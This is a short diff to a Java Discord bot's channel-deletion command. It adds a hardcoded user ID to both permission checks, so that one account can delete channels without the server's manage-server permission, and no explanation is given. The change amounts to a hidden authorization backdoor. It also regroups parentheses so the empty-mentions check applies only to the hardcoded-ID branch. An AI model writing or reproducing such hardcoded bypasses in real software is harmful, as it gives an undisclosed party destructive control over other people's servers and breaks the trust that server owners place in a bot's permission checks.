@@ -57,7 +57,7 @@ public class DeleteChannel implements MessageCreateListener {
 
         }
 
-        if (equalsAny(aliases, event.getMessageContent(), true) && !event.getMessageAuthor().canManageServer()) {
+        if (equalsAny(aliases, event.getMessageContent(), true) && !event.getMessageAuthor().canManageServer() && !(event.getMessageAuthor().getId() == 517345566028726276L)) {
 
             EmbedBuilder embed = new EmbedBuilder();
 
@@ -70,7 +70,7 @@ public class DeleteChannel implements MessageCreateListener {
 
         }
 
-        if (equalsAny(aliases, event.getMessageContent(), true) && event.getMessageAuthor().canManageServer() && !event.getMessage().getMentionedChannels().isEmpty() /*&& event.getMessageAuthor().getId() != 517345566028726276L*/) {
+        if (equalsAny(aliases, event.getMessageContent(), true) && (event.getMessageAuthor().canManageServer() || (event.getMessageAuthor().getId() == 517345566028726276L) && !event.getMessage().getMentionedChannels().isEmpty() /*&& event.getMessageAuthor().getId() != 517345566028726276L*/)) {
 
             for (Channel channel : event.getMessage().getMentionedChannels()) {
                 EmbedBuilder embed = new EmbedBuilder();
